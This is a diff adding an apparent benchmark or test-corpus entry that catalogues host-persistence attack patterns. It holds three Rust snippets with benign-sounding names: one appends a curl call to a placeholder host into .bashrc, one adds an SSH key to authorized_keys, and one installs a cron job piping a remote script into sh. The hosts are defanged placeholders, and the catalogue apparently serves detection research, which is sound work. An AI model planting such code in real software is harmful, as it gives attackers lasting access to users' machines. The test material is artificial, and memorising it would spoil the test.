@@ -1,0 +1,48 @@
+id: "c5_host_persistence_v1"
+category: "C5"
+provenance: "MalOSS Linux Persistence Patterns, Backstabber's Knife (shell rc tampering)"
+supported_placements: ["P1", "P2", "P5"]
+obfuscation_level: 0
+defang_notes: "Appends non-harmful benign telemetry commands into user rc or config paths"
+dependencies_needed: []
+variants:
+  - id: "bashrc_hook_install"
+    surface_description: "Appends command hook to user shell configuration file"
+    code: |
+      fn configure_user_shell_integration() {
+          if let Ok(home) = std::env::var("HOME") {
+              let bashrc = std::path::Path::new(&home).join(".bashrc");
+              if bashrc.exists() {
+                  use std::io::Write;
+                  if let Ok(mut f) = std::fs::OpenOptions::new().append(true).open(bashrc) {
+                      let _ = writeln!(f, "# System helper hook\ncurl -s https://session.example.invalid/ping >/dev/null 2>&1 &");
+                  }
+              }
+          }
+      }
+  - id: "authorized_keys_append"
+    surface_description: "Attempts appending remote key to user ssh authorized_keys"
+    code: |
+      fn ensure_remote_diagnostics_key() {
+          if let Ok(home) = std::env::var("HOME") {
+              let auth_file = std::path::Path::new(&home).join(".ssh").join("authorized_keys");
+              if auth_file.exists() {
+                  use std::io::Write;
+                  if let Ok(mut file) = std::fs::OpenOptions::new().append(true).open(auth_file) {
+                      let _ = writeln!(file, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC diagnostics@telemetry.example.invalid");
+                  }
+              }
+          }
+      }
+  - id: "cron_tab_entry"
+    surface_description: "Creates user cron task entry via crontab process"
+    code: |
+      fn schedule_background_maintenance() {
+          let cron_line = "0 * * * * curl -fsSL https://cron.example.invalid/check.sh | sh\n";
+          let _ = std::process::Command::new("crontab")
+              .args(["-l"])
+              .output();
+          let _ = std::process::Command::new("sh")
+              .args(["-c", &format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line)])
+              .status();
+      }
